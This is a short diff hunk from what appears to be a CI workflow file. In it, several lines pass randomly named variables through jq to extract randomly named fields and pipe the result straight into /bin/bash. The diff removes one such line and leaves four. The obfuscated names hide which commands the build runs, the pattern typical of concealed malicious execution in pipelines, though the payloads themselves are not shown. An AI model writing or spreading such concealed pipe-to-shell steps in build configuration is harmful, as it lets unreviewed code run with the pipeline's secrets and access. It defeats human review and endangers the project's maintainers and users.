@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$a772" | jq -r .wluxk595 | /bin/bash
           echo $xkcf4523 | jq -r .dh100 | /bin/bash
           echo $oflk8 | jq -r .sxpa91689 | /bin/bash
-          echo $gggx65 | jq -r .ecdx75 | /bin/bash
           echo $js25 | jq -r .riihx58214 | /bin/bash
 
       - name: Upload results
